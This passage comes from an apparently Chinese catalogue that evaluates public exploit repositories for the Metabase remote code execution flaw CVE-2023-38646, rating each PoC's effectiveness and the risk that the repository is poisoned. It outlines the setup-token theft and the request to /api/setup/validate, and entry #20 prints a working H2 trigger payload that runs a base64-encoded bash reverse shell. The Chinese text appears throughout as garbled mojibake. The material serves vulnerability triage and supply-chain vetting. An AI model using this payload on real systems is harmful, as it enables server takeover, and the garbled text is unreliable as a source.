**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Token:** é¦–å…ˆï¼Œåˆ©ç”¨`CVE-2023-38646-POC.py`è„šæœ¬ï¼Œé€šè¿‡è®¿é—®`/api/session/properties`æ¥å£æ¥è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚æ­¤æ­¥éª¤ç”¨äºåˆ¤æ–­ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œä»¥åŠè·å–åç»­åˆ©ç”¨æ‰€éœ€çš„tokenã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚:**  ä½¿ç”¨`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬ï¼Œè¯¥è„šæœ¬åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ `pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œï¼Œä»è€Œè§¦å‘ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è„šæœ¬å°†åå¼¹shellçš„bashå‘½ä»¤è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åå°†å…¶æ³¨å…¥åˆ°è§¦å‘å™¨ä¸­ã€‚
3.  **å‘é€ POST è¯·æ±‚:** å°†æ„é€ å¥½çš„åŒ…å«æ¶æ„ä»£ç çš„ JSON æ•°æ®é€šè¿‡ POST è¯·æ±‚å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚æ­¤è¯·æ±‚ä½¿ç”¨è·å–çš„ `setup-token` è¿›è¡ŒéªŒè¯ï¼Œå¹¶è§¦å‘ H2 æ•°æ®åº“è¿æ¥ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´çš„ POC ä»£ç æœ‰æ•ˆã€‚æœç´¢å¼•æ“ç»“æœä¹Ÿè¡¨æ˜å­˜åœ¨å…¬å¼€çš„ POC å¹¶ä¸”è¯¥æ¼æ´å·²è¢«ç§¯æåˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

`CVE-2023-38646-POC.py` è„šæœ¬åªæ˜¯ç”¨äºè·å– setup tokenï¼Œç›¸å¯¹å®‰å…¨ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ã€‚
`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬æœ¬èº«å®ç°äº†æ¼æ´åˆ©ç”¨ï¼Œä½†ä¸»è¦çš„åŠŸèƒ½æ˜¯å®ç°åå¼¹ shellã€‚ ä»£ç ä¸­å¯¹bashå‘½ä»¤è¿›è¡Œäº†base64ç¼–ç ,ä¸€å®šç¨‹åº¦ä¸Šå¢åŠ äº†ä»£ç é˜…è¯»çš„éš¾åº¦ã€‚å­˜åœ¨ä¸€å®šé£é™©ï¼š
    * ç¼–ç å¯èƒ½å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ï¼Œä¾‹å¦‚æ’å…¥é¢å¤–çš„å‘½ä»¤æˆ–ä¿®æ”¹åå¼¹ shell çš„è¡Œä¸ºã€‚å°½ç®¡ç›®å‰ä»£ç çœ‹ä¸Šå»æ˜¯å®ç°æ­£å¸¸çš„åå¼¹shellï¼Œä½†å­˜åœ¨è¢«ç¯¡æ”¹çš„å¯èƒ½æ€§ã€‚ä¾‹å¦‚ï¼Œåœ¨base64ç¼–ç å‰ååŠ å…¥æ¶æ„æŒ‡ä»¤ã€‚
    * è¯¥è„šæœ¬ä¾èµ–äºç›®æ ‡ç³»ç»Ÿä¸Šå­˜åœ¨ bash å’Œ base64 å‘½ä»¤ã€‚è™½ç„¶å¤§å¤šæ•° Linux ç³»ç»Ÿéƒ½åŒ…å«è¿™äº›å‘½ä»¤ï¼Œä½†åœ¨æŸäº›å—é™ç¯å¢ƒä¸­å¯èƒ½ä¸å­˜åœ¨ã€‚ä½œè€…æ¸…æ¥šè¿™ä¸€ç‚¹,ä½†å¹¶æœªå¯¹è¿™ç§æƒ…å†µè¿›è¡Œå¤„ç†,å®¹æ˜“é€ æˆè¯¯åˆ¤.
ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦çš„é£é™©é›†ä¸­åœ¨base64ç¼–ç å†…å®¹å¯èƒ½å­˜åœ¨è¢«ä¿®æ”¹æˆ–æ¤å…¥åé—¨çš„é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [yxl2001/CVE-2023-38646](https://github.com/yxl2001/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---



---

## POC #17

**æ¥æº**: [CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md](../2023/CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯¹å¤–å¼€æ”¾ï¼Œä¸”ç‰ˆæœ¬ä½äºå®‰å…¨ç‰ˆæœ¬ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœä»¥åŠæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åšå‡ºä»¥ä¸‹åˆ¤æ–­ï¼š

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æœ‰æ•ˆã€‚ä»£ç åˆ©ç”¨äº† Metabase åœ¨è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´é€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„POCä»£ç ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥POCè„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œåå¼¹shellï¼Œå°†ç›®æ ‡æœºå™¨çš„shellåå¼¹åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPå’Œç«¯å£ã€‚ä¸»è¦é€»è¾‘éƒ½åœ¨æ„é€ payloadä¸Šï¼Œæ²¡æœ‰å‘ç°ä½œè€…éšè—çš„æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚è¿™ä¸ªtokenå¯ä»¥é€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å¾—ï¼Œè¯¥æ¥å£æ— éœ€èº«ä»½éªŒè¯ã€‚
2.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„ `payload`ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„ `payload` å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  Metabase å°è¯•è¿æ¥æ¶æ„æ•°æ®åº“ï¼Œä»è€Œè§¦å‘æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…·ä½“æ˜¯é€šè¿‡åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ï¼Œè¿™æ®µä»£ç ä¼šè°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
5.  POCä»£ç ä¸­ï¼Œåˆ©ç”¨ `bash -c` å’Œ `base64` å‘½ä»¤ç»„åˆï¼Œæ‰§è¡Œ base64 ç¼–ç åçš„åå¼¹ shell å‘½ä»¤ï¼Œå®ç°åå¼¹ shellã€‚

**é¡¹ç›®åœ°å€:** [alexandre-pecorilla/CVE-2023-38646](https://github.com/alexandre-pecorilla/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #18

**æ¥æº**: [CVE-2023-38646-asepsaepdin_CVE-2023-38646.md](../2023/CVE-2023-38646-asepsaepdin_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ) å’Œ < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬ä½äºå—å½±å“ç‰ˆæœ¬ï¼Œä¸”å¯ä»¥é€šè¿‡HTTP/HTTPSè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´åˆ©ç”¨ä»£ç `CVE-2023-38646-POC.py`å’Œ`CVE-2023-38646-Reverse-Shell.py`æä¾›äº†ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š

1.  **æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
    *   **è·å–Setup Tokenï¼š** é¦–å…ˆï¼Œ`CVE-2023-38646-POC.py` è„šæœ¬é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹æ¥è·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚è¯¥Tokenåœ¨åˆå§‹åŒ–è®¾ç½®é˜¶æ®µä½¿ç”¨ï¼Œæ˜¯åç»­åˆ©ç”¨çš„å…³é”®ã€‚
    *   **Reverse Shellåˆ©ç”¨ï¼š** `CVE-2023-38646-Reverse-Shell.py` è„šæœ¬åˆ©ç”¨è·å–çš„Setup Tokenï¼Œé€šè¿‡å‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå¹¶æ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå°†Payloadæ³¨å…¥åˆ°æ•°æ®åº“é…ç½®ä¸­ã€‚è¯¥Payloadä¼šæ‰§è¡Œä¸€ä¸ªåå‘Shellå‘½ä»¤ï¼Œè¿æ¥åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

2.  **æœ‰æ•ˆæ€§ï¼š**
    æ ¹æ®æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„POCä»£ç ï¼Œå¯ä»¥åˆ¤æ–­æ­¤POC**æœ‰æ•ˆ**ã€‚å¤šä¸ªæ¥æºè¯å®äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œå¯åˆ©ç”¨æ€§ï¼Œå¹¶ä¸”æä¾›äº†å¯æ“ä½œçš„POCã€‚

3.  **æŠ•æ¯’é£é™©ï¼š**
    ä»£ç ä¸­å‘ç°çš„æ½œåœ¨æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦åˆ†æå¦‚ä¸‹ï¼š
    *   `CVE-2023-38646-POC.py` ä¸»è¦ç”¨äºè·å–Setup Tokenï¼ŒåŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºã€‚
    *   `CVE-2023-38646-Reverse-Shell.py` çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨Setup Tokenæ‰§è¡ŒRCEï¼Œä½†æ˜¯æ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå‘è¿æ¥çš„IPå’Œç«¯å£ï¼Œå› æ­¤ä»£ç æœ¬èº«åªæ˜¯æä¾›äº†ä¸€ä¸ªæ¡†æ¶ã€‚é£é™©ç‚¹åœ¨äºå¦‚æœæ”»å‡»è€…ä¸å°å¿ƒä½¿ç”¨äº†é”™è¯¯çš„payloadï¼Œå¯èƒ½å¯¼è‡´ç›®æ ‡ç³»ç»Ÿå´©æºƒæˆ–å…¶ä»–å¼‚å¸¸ã€‚

   æ€»ä½“æ¥è¯´ï¼Œé£é™©ä¸»è¦é›†ä¸­åœ¨payloadçš„æ„å»ºå’Œæ‰§è¡Œä¸Šï¼Œè€Œéä»£ç æœ¬èº«å­˜åœ¨æ¶æ„æ³¨å…¥ã€‚ä½†ä¾æ—§éœ€è¦å¯¹ä¸‹è½½çš„è„šæœ¬è¿›è¡Œå…¨é¢çš„ä»£ç å®¡è®¡ã€‚


**é¡¹ç›®åœ°å€:** [asepsaepdin/CVE-2023-38646](https://github.com/asepsaepdin/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #19

**æ¥æº**: [CVE-2023-38646-birdm4nw_CVE-2023-38646.md](../2023/CVE-2023-38646-birdm4nw_CVE-2023-38646.md)

## CVE-2023-38646 - Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…ä»¥æœåŠ¡å™¨æƒé™æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ), å…¶ä»–å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2.

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 æ˜¯ Metabase ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **è·å–setup-token:**  æ”»å‡»è€…é¦–å…ˆå‘ `/api/session/properties` å‘é€ GET è¯·æ±‚ï¼Œæå– `setup-token`ã€‚
2.  **æ„é€ æ¶æ„payload:**  æ„é€ åŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥è¿æ¥å­—ç¬¦ä¸²åˆ©ç”¨ `TRACE_LEVEL_SYSTEM_OUT` å‚æ•°å’Œ `CREATE TRIGGER` è¯­å¥ï¼Œåœ¨H2æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨æ¯æ¬¡ä» `INFORMATION_SCHEMA.TABLES` è¡¨ä¸­é€‰æ‹©æ•°æ®ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä¸­åŒ…å«çš„ Javascript ä»£ç ä½¿ç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
3.  **å‘é€payload:**  å°†æ„é€ å¥½çš„ payload å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  **æ‰§è¡Œå‘½ä»¤:**  Metabase å°è¯•ä½¿ç”¨æä¾›çš„æ•°æ®åº“è¿æ¥ï¼Œè§¦å‘æ¶æ„çš„ H2 è§¦å‘å™¨ï¼Œä»è€Œæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ã€‚

è¯¥æ¼æ´åˆ©ç”¨ä»£ç é¦–å…ˆè·å–Metabaseçš„`setup-token`ï¼Œç„¶åæ„é€ ä¸€ä¸ªæ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œé€šè¿‡`TRACE_LEVEL_SYSTEM_OUT`å’Œ`CREATE TRIGGER`æœºåˆ¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ä»£ç ä¸­ä½¿ç”¨äº†base64ç¼–ç æ¥ç»•è¿‡ä¸€äº›è¿‡æ»¤ï¼Œå¹¶åœ¨payloadä¸­éšæœºç”Ÿæˆå­—ç¬¦ä¸²æ¥é¿å…ç¼“å­˜ç­‰é—®é¢˜ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

æŸ¥çœ‹æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¹¶æ²¡æœ‰å‘ç°æ˜æ˜¾çš„æ¶æ„ä»£ç ã€‚ä»£ç çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´è¿›è¡Œåå¼¹shellï¼Œè™½ç„¶åå¼¹shellæœ¬èº«å…·æœ‰ä¸€å®šçš„é£é™©ï¼Œä½†è¿™æ˜¯æ¼æ´åˆ©ç”¨çš„æ­£å¸¸è¡Œä¸ºï¼Œä¸åº”è§†ä¸ºæŠ•æ¯’ã€‚`README.md`æ–‡ä»¶ä¹Ÿæ²¡æœ‰ä»»ä½•å¯ç–‘ä¹‹å¤„ã€‚å¯ä»¥åˆ¤æ–­æ­¤ä»“åº“ä¸­ä½œè€…éšè—æŠ•æ¯’ä»£ç çš„å¯èƒ½æ€§å¾ˆä½ï¼Œæ¦‚ç‡ä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [birdm4nw/CVE-2023-38646](https://github.com/birdm4nw/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #20

**æ¥æº**: [CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md](../2023/CVE-2023-38646-j0yb0y0h_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»æˆæƒçš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ç³»ç»Ÿè¿è¡Œå­˜åœ¨æ¼æ´çš„Metabaseç‰ˆæœ¬ï¼Œä¸”æ”»å‡»è€…å¯ä»¥è®¿é—®MetabaseæœåŠ¡ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œæƒé™ä¸æœåŠ¡å™¨ç›¸åŒã€‚æ¼æ´å­˜åœ¨äº Metabase çš„è®¾ç½®æµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒé€šè¿‡ä»¥ä¸‹æ­¥éª¤åˆ©ç”¨æ¼æ´ï¼š
1.  è·å– setup-token, ç”¨äºåç»­çš„åˆ©ç”¨ã€‚
2.  æ„é€ åŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ POST è¯·æ±‚ï¼Œå‘é€åˆ° /api/setup/validate æ¥å£ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä¸€ä¸ª SQL è§¦å‘å™¨ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® INFORMATION_SCHEMA.TABLES æ—¶æ‰§è¡Œä»»æ„çš„ base64 ç¼–ç çš„å‘½ä»¤ã€‚
3.  æ‰§è¡Œçš„å‘½ä»¤æ˜¯åå¼¹shellï¼Œå°†ç›®æ ‡æœåŠ¡å™¨çš„ shell é‡å®šå‘åˆ°æ”»å‡»è€…çš„ IP åœ°å€å’Œç«¯å£ã€‚

**æŠ•æ¯’é£é™©ï¼š**
ä»“åº“ä¸­å¯èƒ½å­˜åœ¨æŠ•æ¯’ä»£ç çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 10%ã€‚ä¸»è¦é£é™©æ¥è‡ªäºï¼š
1.  `add_padding`å‡½æ•°ï¼šè¿™ä¸ªå‡½æ•°çœ‹ä¼¼æ˜¯ä¸ºäº†æ¶ˆé™¤ base64 ç¼–ç åçš„ç­‰å·ï¼Œä½†æ¶æ„æ”»å‡»è€…å¯èƒ½é€šè¿‡ä¿®æ”¹æ­¤å‡½æ•°æ¥æ’å…¥æ¶æ„ä»£ç ï¼Œè™½ç„¶å½“å‰çš„ç›®çš„æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›è¿‡æ»¤æœºåˆ¶ï¼Œä½†å­˜åœ¨è¢«æ»¥ç”¨çš„é£é™©ï¼Œé€šè¿‡ä¿®æ”¹payloadæ„é€ è¿‡ç¨‹æ¤å…¥æ¶æ„ä»£ç ã€‚
2.  åå¼¹ Shell çš„IPå’Œç«¯å£æ˜¯ç”¨æˆ·æŒ‡å®šçš„ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…æ— æ³•é€šè¿‡ç›´æ¥ä¿®æ”¹ä»£ç æ¥æ¤å…¥åé—¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  **æ¼æ´å®šä½ï¼š** æ¼æ´å­˜åœ¨äºMetabaseçš„å®‰è£…è®¾ç½®é˜¶æ®µï¼Œå…·ä½“ä½äº`api/setup/validate`æ¥å£ã€‚
2.  **è·å–Tokenï¼š** é€šè¿‡è®¿é—®`/api/session/properties`è·å–`setup-token`ï¼Œè¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚
3.  **æ„é€ Payloadï¼š**  æ ¸å¿ƒåœ¨äºæ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åŒ…å«ä»¥ä¸‹å…³é”®éƒ¨åˆ†ï¼š
    *   `zip:/app/metabase.jar!/sample-database.db`ï¼šæŒ‡å®šæ•°æ®åº“æ–‡ä»¶çš„ä½ç½®ã€‚
    *   `MODE=MSSQLServer`ï¼šè®¾ç½®æ•°æ®åº“æ¨¡å¼ä¸ºMSSQLServerï¼Œè¿™æ˜¯è§¦å‘æ¼æ´çš„å¿…è¦æ¡ä»¶ã€‚
    *   `TRACE_LEVEL_SYSTEM_OUT=1`ï¼šå¯ç”¨ç³»ç»Ÿè¾“å‡ºè·Ÿè¸ªã€‚
    *   `CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x`ï¼šåˆ›å»ºä¸€ä¸ªåä¸º`pwnshell`çš„è§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢`INFORMATION_SCHEMA.TABLES`è¡¨ä¹‹å‰æ‰§è¡Œã€‚è§¦å‘å™¨ä½¿ç”¨ JavaScript è°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œåå¼¹shellå‘½ä»¤ã€‚`{payload}`ä¼šè¢«æ›¿æ¢ä¸ºbase64ç¼–ç åçš„åå¼¹shellå‘½ä»¤ï¼Œå…¶ä¸­åˆ©ç”¨äº†bashçš„ç‰¹æ€§è¿›è¡Œè§£ç å’Œæ‰§è¡Œã€‚
4.  **å‘é€è¯·æ±‚ï¼š** å°†æ„é€ å¥½çš„åŒ…å«payloadçš„JSONæ•°æ®ï¼Œé€šè¿‡POSTè¯·æ±‚å‘é€åˆ°`/api/setup/validate`æ¥å£ã€‚
5.  **æ‰§è¡Œå‘½ä»¤ï¼š**  å½“Metabaseå°è¯•è¿æ¥åˆ°æ¶æ„æ„é€ çš„æ•°æ®åº“æ—¶ï¼Œè§¦å‘å™¨è¢«æ‰§è¡Œï¼Œä»è€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [j0yb0y0h/CVE-2023-38646](https://github.com/j0yb0y0h/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #21

**æ¥æº**: [CVE-2023-38646-junnythemarksman_CVE-2023-38646.md](../2023/CVE-2023-38646-junnythemarksman_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

